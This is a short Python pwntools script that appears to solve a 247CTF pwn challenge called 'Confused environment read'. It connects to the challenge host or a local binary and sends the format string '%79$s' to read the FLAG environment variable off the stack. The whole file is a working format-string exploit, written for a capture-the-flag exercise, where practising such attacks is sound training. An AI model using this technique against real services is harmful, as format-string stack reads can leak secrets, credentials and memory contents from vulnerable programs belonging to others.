#!/usr/bin/env python3
"""
Confused environment read - 247CTF PWN
Format string to leak FLAG environment variable
"""
from pwn import *

def exploit(target='remote'):
    if target == 'remote':
        p = remote('be5e6052dcced454.247ctf.com', 50202)
    else:
        p = process('./chall')

    p.recvuntil(b'again?')

    # FLAG env var is at offset 79 on stack
    p.sendline(b'%79$s')

    response = p.recvline()
    print(response.decode())

    p.close()

if __name__ == '__main__':
    exploit()
